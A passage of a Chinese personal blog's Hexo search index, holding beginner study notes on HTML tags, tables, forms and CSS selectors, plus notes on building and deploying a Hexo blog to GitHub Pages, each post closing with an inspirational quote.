charset=&quot;UTF-8&quot;&gt;    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;    &lt;title&gt;Document&lt;/title&gt;    &lt;style&gt;        .类名1&#123;background-color:blue;&#125;                              #就近原则，离开头最近的style为准        .类名2&#123;background-color:red;&#125;    &lt;/style&gt;&lt;/head&gt;&lt;body&gt;    &lt;div class=&quot;类名1 类名2&quot;&gt;222&lt;/div&gt;                              #空格可以放置多个类名&lt;/body&gt;&lt;/html&gt;</code></pre><p>2.id选择器</p><pre><code>&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;    &lt;title&gt;Document&lt;/title&gt;    &lt;style&gt;        #box1&#123;background-color:yellow;&#125;        #box3&#123;background-color:blue;&#125;        #box2&#123;background-color:red;&#125;    &lt;/style&gt;&lt;/head&gt;&lt;body&gt;    &lt;div&gt;1111111111&lt;/div&gt;    &lt;div id=&quot;box1&quot;&gt;2222222222&lt;/div&gt;    &lt;div id=&quot;box2&quot;&gt;3333333333&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;语法：#id名&#123;属性：属性值;&#125; A）使用id选择符时，应该为每个元素定义一个id属性 如：&lt;divid=&quot;box&quot;&gt;&lt;/div&gt; B）id选择符的语法格式是“#”加上自定义的id名 如：#box&#123;width:300px;height:300px;&#125; C）起名时要取英文名，不能用关键字：（所有的标记和属性都是关键字） 如：head标记 D）一个id名称只能对应文档中一个具体的元素对象,多个时就不显示样式。（唯一性）</code></pre><p>3.通配符选择器</p><pre><code>&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;    &lt;title&gt;Document&lt;/title&gt;    &lt;style&gt;        *&#123;            margin:0;      #外边距为0            padding:0;     #内边距为0        &#125;    &lt;/style&gt;&lt;/head&gt;&lt;body&gt;    &lt;div&gt;1111111111&lt;/div&gt;    &lt;div id=&quot;box1&quot;&gt;2222222222&lt;/div&gt;    &lt;div id=&quot;box2&quot;&gt;3333333333&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;语法：*&#123;属性:属性值;&#125; 说明：通配选择符的写法是“*”，其含义就是所有元素。 *&#123;margin:0;padding:0;&#125;代表清除所有元素的默认边距值和填充值</code></pre><p>4.群组与后代选择器</p><pre><code>    &lt;style&gt;        标签们或者class内的类名们&#123;background-color:yellow&#125;      #标签们之间要加逗号，而且类名前要加.    &lt;/style&gt;若之间不加逗号则是后代选择器，仅更改空格代表的后代#从右到左地选择</code></pre><p>5.伪类选择器</p><pre><code>&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;    &lt;title&gt;Document&lt;/title&gt;    &lt;style&gt;        a:link&#123;color:yellow;&#125;        a:visited&#123;color:red;&#125;        a:hover&#123;color:orange;&#125;        a:active&#123;color:blue;&#125;    &lt;/style&gt;&lt;/head&gt;&lt;body&gt;    &lt;a herf=&quot;超链接&quot;&gt;        内容    &lt;/a&gt;&lt;/body&gt;&lt;/html&gt;语法： a：link&#123;属性：属性值;&#125;超链接的初始状态 a.visited(属性：属性值;&#125;超链接被访问后的状态 a:hovert&#123;属性：属性值;&#125;鼠标悬停的状态 a:active&#123;属性：属性值;&#125;超链接被激活时的状态说明： A）顺序为： a:link,a:visited,a:hover,a:active,错误的顺序有时会使超链接的样式失效 B）为了简化代码，可以把伪类选择符中相同的声明提出来放在a选择符中； 例如：a&#123;color:red;&#125;a:hover&#123;color:green;&#125;表示超链接的初始和访问过后的状态一样，鼠标划过的状态和点击时的状态一样。</code></pre><p>6.选择器的权重<br>!important&gt;内联样式&gt;包含选择符&gt;id选择器&gt;class选择器&gt;类型（元素）选择器<br>有冲突时高权重覆盖低权重<br>相同权重就近原则（哪个先被定义）</p><h5 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h5><p>渔夫出海前，并不知道鱼在哪里。可他们还是选择了出发，因为他们相信，自己一定会满载而归。人生很多时候，是因为选择了才有机会，相信了才有可能。————稻盛和夫</p>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTML基础（2）</title>
      <link href="/2022/10/07/b-3/"/>
      <url>/2022/10/07/b-3/</url>
      
        <content type="html"><![CDATA[<h5 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h5><h3 id="表格"><a href="#表格" class="headerlink" title="表格"></a>表格</h3><pre><code>&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;    &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;table border=&quot;1&quot; width=&quot;500px&quot;               &lt;!-- 创建表格 --&gt;    align=&quot;center&quot;    bordercolor=&quot;red&quot;    bgcolor=&quot;yellow&quot;    cellspacing=&quot;20&quot;    cellpadding=&quot;100&quot;&gt;                            &lt;!-- 可以选择换不换行，但是&gt;要放在最后 --&gt;        &lt;tr&gt;                                      &lt;!-- tr是行 --&gt;            &lt;td&gt;内容&lt;/td&gt;                         &lt;!-- td是单元格 --&gt;        &lt;/tr&gt;        &lt;tr bgcolor=&quot;orange&quot; height=&quot;100&quot; align=&quot;center&quot; valign=&quot;bottom&quot;&gt;            &lt;td bgcolor=&quot;red&quot; align=&quot;right&quot; valign=&quot;top&quot;&gt;内容&lt;/td&gt;        &lt;/tr&gt;    &lt;/table&gt;&lt;/body&gt;&lt;/html&gt;表格table属性 1. 宽度 width            （可以写成百分比————父元素的百分比）2. 高度 height           （只能写像素px）3. 边框 border 4. 边框颜色 bordercolor 5. 背景颜色 bgcolor 6. 水平对齐 align=&quot;left&quot;或right或center 7. cellspacing=&quot;单元格与单元格之间的间距 8. cellpadding=&quot;单元格与内容之间的空隙行tr属性 1. 高度 height 2. 背景颜色 色bgcolor 3. 文字水平对齐 align=“left或right或center” 4. 文字垂直对齐 子valign=“top或middle或bottom&quot;单元格td属性（table data）1. 宽度 width （影响一列）2. 高度 height （影响一行）3. 背景颜色 bgcolor 4. 文字水平对齐 align=“left或right或center” 5. 文字垂直对齐 valign=“top或middle或bottom表格合并colspan=&quot;要合并的列数&quot;rowspan=&quot;要合并的行数&quot;注意不能合并成T型，合并之后要把被占的元素删除（注释掉）</code></pre><h3 id="表单"><a href="#表单" class="headerlink" title="表单"></a>表单</h3><pre><code>&lt;body&gt;    &lt;form action=&quot;地址&quot; method=&quot;POST&quot;&gt;                                                     &lt;!-- POST是不显示在url的，GET会暴露 --&gt;        内容：&lt;input type=&quot;text&quot; placeholder=&quot;提示信息，输入内容后会消失&quot; name=&quot;内容&quot;&gt;        &lt;!-- 输入的完全显示 --&gt;        内容：&lt;input type=&quot;password&quot; placeholder=&quot;提示信息，输入内容后会消失&quot; name=&quot;内容&quot;&gt;    &lt;!-- 输入的显示为一个点 --&gt;        &lt;input type=&quot;submit&quot; value=&quot;按钮上的内容&quot; &gt;                                         &lt;!-- 提交信息到action指定的地址 --&gt;           &lt;input type=&quot;reset&quot; value=&quot;按钮上的内容&quot; &gt;                                          &lt;!-- 清除全部表单内容 --&gt;        &lt;input type=&quot;button&quot; value=&quot;按钮上的内容&quot; &gt;                                         &lt;!-- 自定义按钮 --&gt;    &lt;/form&gt;&lt;/body&gt;***不设置name就不能发送***typr=&quot;submit&quot;相当于&lt;button&gt;内容&lt;/button&gt;Form当中method的post和get的区别？ 1.get是从服务器上获取数据，post是向服务器传送数据。 2.get是把参数数据队列加到提交表单的ACTION属性所指的URL中，值和表单内各个字段——对应，在URL中可以看到。  post 是通过HTTPpost机制，将表单内各个字段与其内容放置在HTMLHEADER内一起传送到ACTION属性所指的URL地址。用户看不到这个过程。 3.对于get方式，服务器端用Request.QueryString获取变量的值，对于post方式，服务器端用Request.Form获取提交的数据。 4.get传送的数据量较小。post传送的数据量较大，一般为不受限制。</code></pre><h5 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h5><p>生活，在喜怒哀乐间走走停停 不知道会遇见什么，只知道阳光这么好，别辜负了今天，早安！</p>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTML基础（1）</title>
      <link href="/2022/10/06/b-4/"/>
      <url>/2022/10/06/b-4/</url>
      
        <content type="html"><![CDATA[<h5 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h5><h3 id="1-什么是HTML"><a href="#1-什么是HTML" class="headerlink" title="1.什么是HTML"></a>1.什么是HTML</h3><p>是扩展名，超文本标记语言(Hyper Text Markup Language)<br>不是编程语言而是由标签组成的标记语言</p><h3 id="2-兼容性"><a href="#2-兼容性" class="headerlink" title="2.兼容性"></a>2.兼容性</h3><p>查询网站<br>不同浏览器兼容性不一样，因此需要Web标准的制定<br>W3C万维网联盟</p><h3 id="3-WEB组成部分"><a href="#3-WEB组成部分" class="headerlink" title="3.WEB组成部分"></a>3.WEB组成部分</h3><p>HTML:结构，由W3C制定标准和语法<br>CSS:样式布局<br>JS:触发行为</p><h3 id="4-HTML基本语法"><a href="#4-HTML基本语法" class="headerlink" title="4.HTML基本语法"></a>4.HTML基本语法</h3><p>(1)常规标记/双标记<br>&lt;标记 属性=”属性值”&gt;<br>&lt;/。。。&gt;<br>(2)空标记/单标记<br>&lt;标记 属性=”属性值”/&gt;</p><h3 id="5-基本结构"><a href="#5-基本结构" class="headerlink" title="5.基本结构"></a>5.基本结构</h3><pre><code>&lt;!DOCTYPE html 5&gt;                     #文档说明标签（格式说明使用html5）&lt;html lang=&quot;en&quot;&gt;                      #语言zh-CN/ja-jp/en（对网址翻译）&lt;head&gt;  &lt;meta charset=&quot;UTF-8&quot;&gt;              #编码ASCII/ISO-8859-1/GB2312/UTF-8  &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;  &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;  &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt;  &lt;/body&gt;&lt;/html&gt;</code></pre><h3 id="6-开发工具"><a href="#6-开发工具" class="headerlink" title="6.开发工具"></a>6.开发工具</h3><p>Sublime Text，webstorm,HBuilderX,VScode<br>快捷键:选中文本alt+w添加&lt; p &gt;<br>ctrl+/注释<br>ul&gt;li{内容}*n + 回车 建立n个无序列表并加上内容<br>dl&gt;dt{内容}+dd{内容} + 回车 建立自定义列表并加上内容</p><h3 id="7-基本标签"><a href="#7-基本标签" class="headerlink" title="7.基本标签"></a>7.基本标签</h3><pre><code>(1)标题标签    &lt;h1&gt;一级标题最大&lt;/h1&gt;    &lt;h6&gt;最小六级标题&lt;/h6&gt;(2)段落文本标签    &lt;p&gt;段落文本内容&lt;/p&gt;    段与段间有间隔(3)水平线标签(同时更改颜色，长度，位置，关闭阴影)                       #注意一对标签的格式加/    &lt;hr color=&quot;green&quot; width=&quot;600&quot; align=&quot;left/right&quot; noshade&gt;(4)文本修饰标签————加粗   &lt;b&gt;普通加粗&lt;strong&gt;便于爬虫(5)文本修饰标签————倾斜   &lt;em&gt;或&lt;i&gt;(6)文本修饰标签————删除   &lt;s&gt;或&lt;del&gt;(7)文本修饰标签————下划线   &lt;u&gt;(8)文本修饰标签————上下标   &lt;sub&gt;/&lt;sup&gt;(9)划分区域，占一行（破坏结构）   &lt;div&gt;内容&lt;/div&gt;(10)独立修饰文本（不破坏结构）   &lt;span&gt;内容&lt;/span&gt;</code></pre><h3 id="8-特殊符号"><a href="#8-特殊符号" class="headerlink" title="8.特殊符号"></a>8.特殊符号</h3><pre><code>尖角号      &amp;lt;左    &amp;gt;右空格        &amp;nbsp;受字体影响    &amp;emsp;一个中文宽度版权        &amp;copy;©商标        &amp;trade; TM标签      &amp;reg; R标签</code></pre><h3 id="9-列表"><a href="#9-列表" class="headerlink" title="9.列表"></a>9.列表</h3><pre><code>(1)有序&lt;!-- li里可以随意放标签，ol里只能放li，数字1.2.3.是自动生成的 --&gt;&lt;ol type=&quot;A&quot; start=&quot;&quot;4&gt;    &lt;li&gt;                             #type只能是1，a，A，i，I    &lt;/li&gt;                     start只能取一个数字1，2，3...&lt;/ol&gt;(2)无序&lt;!-- ul里只能放li，li里随便放 --&gt;&lt;ul type=&quot;none&quot;&gt;    &lt;li&gt;                             #默认是黑色实心圆    &lt;/li&gt;                     type只能填disc，circle，square，none（取消）&lt;/ul&gt;(3)自定义&lt;dl&gt;    &lt;dt&gt;文字或图&lt;/dt&gt;         #只复制&lt;dd&gt;&lt;dt&gt;是贴在一起的    &lt;dd&gt;相关文字&lt;/dd&gt;          复制&lt;dl&gt;则间隔一行&lt;/dl&gt;</code></pre><h3 id="10-图片"><a href="#10-图片" class="headerlink" title="10.图片"></a>10.图片</h3><h1 id="标签"><a href="#标签" class="headerlink" title="标签"></a>标签</h1><pre><code>&lt;img src=&quot;XXX&quot;&gt;(1)绝对路径（本地有此文件）    直接填地址(2)相对路径    与html文件在同级目录下写             名字.gif  或者  ./名字.gif    图片在下级则直接写地址    图片在上级则先../返回上一级再接着写地址(每一个../都是一次返回上级)#此处要注意：不同操作系统使用的斜杠不同（Linux系统是/  window系统都可以）# 属性&lt;img src=&quot;&quot; alt=&quot;&quot;&gt;(1)alt=（你告诉它要显示的）图片加载失败时的提示信息&quot;(2)title=标题（指针放上去后显示的）(3)width=&quot;200px&quot; height=&quot;200px&quot;更改宽高         #px是像数值，只设置一个时会自动缩放</code></pre><h3 id="11-超链接-a链接"><a href="#11-超链接-a链接" class="headerlink" title="11.超链接(a链接)"></a>11.超链接(a链接)</h3><pre><code>&lt;a herf=&quot;链接&quot; title=&quot;鼠标悬停显示的信息&quot; target=&quot;在何处打开文档&quot;&gt;超链接放置的内容&lt;/a&gt;  (1)target=&quot;_self&quot;      在默认值(2)target=&quot;_blank&quot;     在新窗口打开(3)超链接赋予图片:&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;    &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;a herf=&quot;https://www.baidu.com&quot; title=&quot;百度查询&quot;&gt;        &lt;img src=&quot;图片地址&quot; alt=&quot;&quot;&gt;                          将图片包在超链接中    &lt;/a&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h5 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h5><p>只要你仍然担忧别人对你的看法，你就会受制于他们。唯有当你无须外界的认可时，你才能拥有你自己。————尼尔-唐纳德-沃尔什</p>]]></content>
      
      
      <categories>
          
          <category> hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTML基础（1）</title>
      <link href="/2022/10/06/b-5/"/>
      <url>/2022/10/06/b-5/</url>
      
        <content type="html"><![CDATA[<h5 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h5><h3 id="1-什么是HTML"><a href="#1-什么是HTML" class="headerlink" title="1.什么是HTML"></a>1.什么是HTML</h3><p>是扩展名，超文本标记语言(Hyper Text Markup Language)<br>不是编程语言而是由标签组成的标记语言</p><h3 id="2-兼容性"><a href="#2-兼容性" class="headerlink" title="2.兼容性"></a>2.兼容性</h3><p>查询网站<br>不同浏览器兼容性不一样，因此需要Web标准的制定<br>W3C万维网联盟</p><h3 id="3-WEB组成部分"><a href="#3-WEB组成部分" class="headerlink" title="3.WEB组成部分"></a>3.WEB组成部分</h3><p>HTML:结构，由W3C制定标准和语法<br>CSS:样式布局<br>JS:触发行为</p><h3 id="4-HTML基本语法"><a href="#4-HTML基本语法" class="headerlink" title="4.HTML基本语法"></a>4.HTML基本语法</h3><p>(1)常规标记/双标记<br>&lt;标记 属性=”属性值”&gt;<br>&lt;/。。。&gt;<br>(2)空标记/单标记<br>&lt;标记 属性=”属性值”/&gt;</p><h3 id="5-基本结构"><a href="#5-基本结构" class="headerlink" title="5.基本结构"></a>5.基本结构</h3><pre><code>&lt;!DOCTYPE html 5&gt;                     #文档说明标签（格式说明使用html5）&lt;html lang=&quot;en&quot;&gt;                      #语言zh-CN/ja-jp/en（对网址翻译）&lt;head&gt;  &lt;meta charset=&quot;UTF-8&quot;&gt;              #编码ASCII/ISO-8859-1/GB2312/UTF-8  &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;  &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;  &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt;  &lt;/body&gt;&lt;/html&gt;</code></pre><h3 id="6-开发工具"><a href="#6-开发工具" class="headerlink" title="6.开发工具"></a>6.开发工具</h3><p>Sublime Text，webstorm,HBuilderX,VScode<br>快捷键:选中文本alt+w添加&lt; p &gt;<br>ctrl+/注释<br>ul&gt;li{内容}*n + 回车 建立n个无序列表并加上内容<br>dl&gt;dt{内容}+dd{内容} + 回车 建立自定义列表并加上内容</p><h3 id="7-基本标签"><a href="#7-基本标签" class="headerlink" title="7.基本标签"></a>7.基本标签</h3><pre><code>(1)标题标签    &lt;h1&gt;一级标题最大&lt;/h1&gt;    &lt;h6&gt;最小六级标题&lt;/h6&gt;(2)段落文本标签    &lt;p&gt;段落文本内容&lt;/p&gt;    段与段间有间隔(3)水平线标签(同时更改颜色，长度，位置，关闭阴影)                       #注意一对标签的格式加/    &lt;hr color=&quot;green&quot; width=&quot;600&quot; align=&quot;left/right&quot; noshade&gt;(4)文本修饰标签————加粗   &lt;b&gt;普通加粗&lt;strong&gt;便于爬虫(5)文本修饰标签————倾斜   &lt;em&gt;或&lt;i&gt;(6)文本修饰标签————删除   &lt;s&gt;或&lt;del&gt;(7)文本修饰标签————下划线   &lt;u&gt;(8)文本修饰标签————上下标   &lt;sub&gt;/&lt;sup&gt;(9)划分区域，占一行（破坏结构）   &lt;div&gt;内容&lt;/div&gt;(10)独立修饰文本（不破坏结构）   &lt;span&gt;内容&lt;/span&gt;</code></pre><h3 id="8-特殊符号"><a href="#8-特殊符号" class="headerlink" title="8.特殊符号"></a>8.特殊符号</h3><pre><code>尖角号      &amp;lt;左    &amp;gt;右空格        &amp;nbsp;受字体影响    &amp;emsp;一个中文宽度版权        &amp;copy;©商标        &amp;trade; TM标签      &amp;reg; R标签</code></pre><h3 id="9-列表"><a href="#9-列表" class="headerlink" title="9.列表"></a>9.列表</h3><pre><code>(1)有序&lt;!-- li里可以随意放标签，ol里只能放li，数字1.2.3.是自动生成的 --&gt;&lt;ol type=&quot;A&quot; start=&quot;&quot;4&gt;    &lt;li&gt;                             #type只能是1，a，A，i，I    &lt;/li&gt;                     start只能取一个数字1，2，3...&lt;/ol&gt;(2)无序&lt;!-- ul里只能放li，li里随便放 --&gt;&lt;ul type=&quot;none&quot;&gt;    &lt;li&gt;                             #默认是黑色实心圆    &lt;/li&gt;                     type只能填disc，circle，square，none（取消）&lt;/ul&gt;(3)自定义&lt;dl&gt;    &lt;dt&gt;文字或图&lt;/dt&gt;         #只复制&lt;dd&gt;&lt;dt&gt;是贴在一起的    &lt;dd&gt;相关文字&lt;/dd&gt;          复制&lt;dl&gt;则间隔一行&lt;/dl&gt;</code></pre><h3 id="10-图片"><a href="#10-图片" class="headerlink" title="10.图片"></a>10.图片</h3><h1 id="标签"><a href="#标签" class="headerlink" title="标签"></a>标签</h1><pre><code>&lt;img src=&quot;XXX&quot;&gt;(1)绝对路径（本地有此文件）    直接填地址(2)相对路径    与html文件在同级目录下写             名字.gif  或者  ./名字.gif    图片在下级则直接写地址    图片在上级则先../返回上一级再接着写地址(每一个../都是一次返回上级)#此处要注意：不同操作系统使用的斜杠不同（Linux系统是/  window系统都可以）# 属性&lt;img src=&quot;&quot; alt=&quot;&quot;&gt;(1)alt=（你告诉它要显示的）图片加载失败时的提示信息&quot;(2)title=标题（指针放上去后显示的）(3)width=&quot;200px&quot; height=&quot;200px&quot;更改宽高         #px是像数值，只设置一个时会自动缩放</code></pre><h3 id="11-超链接-a链接"><a href="#11-超链接-a链接" class="headerlink" title="11.超链接(a链接)"></a>11.超链接(a链接)</h3><pre><code>&lt;a herf=&quot;链接&quot; title=&quot;鼠标悬停显示的信息&quot; target=&quot;在何处打开文档&quot;&gt;超链接放置的内容&lt;/a&gt;  (1)target=&quot;_self&quot;      在默认值(2)target=&quot;_blank&quot;     在新窗口打开(3)超链接赋予图片:&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;    &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;a herf=&quot;https://www.baidu.com&quot; title=&quot;百度查询&quot;&gt;        &lt;img src=&quot;图片地址&quot; alt=&quot;&quot;&gt;                          将图片包在超链接中    &lt;/a&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h5 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h5><p>只要你仍然担忧别人对你的看法，你就会受制于他们。唯有当你无须外界的认可时，你才能拥有你自己。————尼尔-唐纳德-沃尔什</p>]]></content>
      
      
      <categories>
          
          <category> hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>啥也没有</title>
      <link href="/2022/10/05/b-2/"/>
      <url>/2022/10/05/b-2/</url>
      
        <content type="html"><![CDATA[<h3 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h3><p>1.今天给blog整了个大装修<br>2.除此之外好像啥也没干</p><h3 id="每日一悟"><a href="#每日一悟" class="headerlink" title="每日一悟"></a>每日一悟</h3><p>在装修过程中发现了修改和添加模块基本上就是更改source和themes两个文件夹<br>原因在上一篇文章中已经给出了详细说明。</p><h3 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h3><p>无论在何种困顿中，唯有内心的自由馈赠我们真正的未来。</p><h3 id="今天就这样吧"><a href="#今天就这样吧" class="headerlink" title="今天就这样吧"></a>今天就这样吧</h3>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>深度了解HexoBlog</title>
      <link href="/2022/10/05/b-1/"/>
      <url>/2022/10/05/b-1/</url>
      
        <content type="html"><![CDATA[<h5 id="深入了解Hexo搭建博客的底层原理"><a href="#深入了解Hexo搭建博客的底层原理" class="headerlink" title="深入了解Hexo搭建博客的底层原理"></a>深入了解Hexo搭建博客的底层原理</h5><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在趟过无数个坑，解决了无数个报错后，终于把这个博客整出来了。<br>现在回过头来，开始对hexo原理好奇起来。</p><h3 id="优缺点"><a href="#优缺点" class="headerlink" title="优缺点"></a>优缺点</h3><p>优点很明显啊，主题多，文件多(利于解决各种各样天花乱坠的报错)，通过修改yaml配置文件来修改样式比较简单。<br>但是缺点一样很明显，bug是真的多(一步错步步错)，每次发布文章都需要重新部署，没有一个后台管理系统(加上GitHub的海外服务器，简直让人欲仙欲死)。</p><h3 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h3><p>博客hexo生成的是静态页面，而Github pages 又支持静态页面的解析。因此二者一拍即合能够用来生成 html 拼合成博客。</p><h3 id="Hexo"><a href="#Hexo" class="headerlink" title="Hexo"></a>Hexo</h3><p>1.Hexo 使用 Markdown（或其他渲染引擎）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。<br>2.文件<br>  ├── node_modules：             #依赖包-安装插件及所需nodejs模块。<br>  ├── public                     #最终网页信息。即存放被解析markdown、html文件。<br>  ├── scaffolds                  #模板文件夹。即当您新建文章时，根据 scaffold生成文件。<br>  ├── source                     #资源文件夹。即存放用户资源。<br>  └── _posts                     #博客文章目录。<br>  └── themes                     #存放主题。Hexo根据主题生成静态页面。<br>  ├── _config.yml                #网站的配置信息。标题、网站名称等。<br>  ├── db.json：                  #source解析所得到的缓存文件。<br>  ├── package.json               # 应用程序信息。即配置Hexo运行需要js包。<br>3.source就是数据库，以.md（markdown）格式存储文章，theme文件夹是主题文件（决定页面模板）。<br>4.部署流程:<br>hexo g：生成静态文件。将我们的数据和界面模板相结合生成静态文件的过程。Hexo（node.js程序）遍历主题文件中你的source目录（js、css、img等静态资源），建立索引，再根据索引生成由html、js、css、img建立的纯静态文件并放在public文件夹里。public就是你的博客了，而这些恰好能被gitpages识别。<br>hexo d：部署文件。主要是根据在_config.yml中配置的git仓库或者coding的地址，将public文件通过git方式push到上传到github或coding的指定分支，然后在根据pages服务呈现出页面。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 学术 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>试验</title>
      <link href="/2022/10/04/a/"/>
      <url>/2022/10/04/a/</url>
      
        <content type="html"><![CDATA[<p><a href="http://t.csdn.cn/FwpOt">写作教程总结</a></p><h1 id="开启服务"><a href="#开启服务" class="headerlink" title="开启服务"></a>开启服务</h1><p>hexo server</p><h1 id="新建文章"><a href="#新建文章" class="headerlink" title="新建文章"></a>新建文章</h1><p>hexo new a</p><h1 id="新建草稿"><a href="#新建草稿" class="headerlink" title="新建草稿"></a>新建草稿</h1><p>hexo new draft b</p><h1 id="发布草稿成为文章"><a href="#发布草稿成为文章" class="headerlink" title="发布草稿成为文章"></a>发布草稿成为文章</h1><p>hexo publish b</p><h1 id="发布关于"><a href="#发布关于" class="headerlink" title="发布关于"></a>发布关于</h1><p>hexo new page c</p><h1 id="生成静态文章"><a href="#生成静态文章" class="headerlink" title="生成静态文章"></a>生成静态文章</h1><p>hexo generate 或者是 hexo g</p><h1 id="部署文章"><a href="#部署文章" class="headerlink" title="部署文章"></a>部署文章</h1><p>hexo deploy 或者是 hexo d</p><p>Markdowm语法:<a href="http://t.csdn.cn/BJSXy">教程</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 学术 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>博客创建日记</title>
      <link href="/2021/09/25/b/"/>
      <url>/2021/09/25/b/</url>
      
        <content type="html"><![CDATA[<h3 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a><strong>每日一记</strong></h3><p>如何使用hexo编写blog文章<br>1.在blog本地文件夹内git bash<br>2.hexo s                                     <em>本地查看，似乎没什么用？</em><br>3.hexo new draft b                           <em>建立草稿</em><br>4.hexo publish b                             <em>发表草稿</em><br>5.hexo new page c                            <em>发布关于</em><br>6.hexo g                                     <em>生成静态文件————也就是能读</em><br>7.hexo d                                     <em>上传部署至GitHub</em><br>8.打开GitHub的个人库查看有没有绿               <em>不是我说，是真的慢！！！！！</em><br>9.打开blog刷新</p><p>如何快速上传<br>————使用DevSidecar边车辅助工具</p><h3 id="每日一悟"><a href="#每日一悟" class="headerlink" title="每日一悟"></a><strong>每日一悟</strong></h3><p>1.每次上传都是对比本地的，不要想着在GitHub里改就能偷懒！<br>2.每次写新文章都可以用上面的，但是最好在b和c后面加上日期<br>3.上传了之后发现有问题可以在本地用VSC改了再发一次<br>4.上面说的修改是指在删除D:\BLOG\hexoblog\source\。。。的同时修改D:\BLOG\hexoblog\source\的对应文件<br>5.如果出现界面信息错误就在D:\BLOG\hexoblog\themes\hexo-theme-matery\的_config这里修改<br>6.猜测要加入其他模块也是在上面那个文件里<br>7.已经尝试了两种方法仍然不能显示图片，应该只能使用图床才能解决(一年9r)<br>8.为了更好地写博客，希望大家赏一个钢镚儿</p><h3 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a><strong>每日一句</strong></h3><p>知识使人自由，至少渴望自由。————特雷弗-诺亚</p>]]></content>
      
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
